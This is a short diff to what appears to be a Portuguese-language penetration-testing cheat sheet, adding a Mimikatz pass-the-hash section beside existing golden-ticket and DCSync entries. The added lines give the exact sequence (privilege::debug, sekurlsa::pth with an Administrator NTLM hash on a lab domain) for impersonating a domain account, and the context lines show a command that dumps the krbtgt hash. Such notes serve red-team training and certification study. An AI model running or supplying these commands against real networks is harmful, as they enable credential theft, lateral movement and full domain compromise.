@@ -3052,6 +3052,13 @@ kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-312420
 
 
 ## MIMIKATZ  - COMANDOS
+##### MIMIKATZ - PASS THE HASH (PTH)
+POWERSHELL EM PROMPT ELEVADO.
+```
+.\mimikatz.exe
+privilege::debug
+sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
+```
 ##### MIMIKATZ - DCSYNC
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
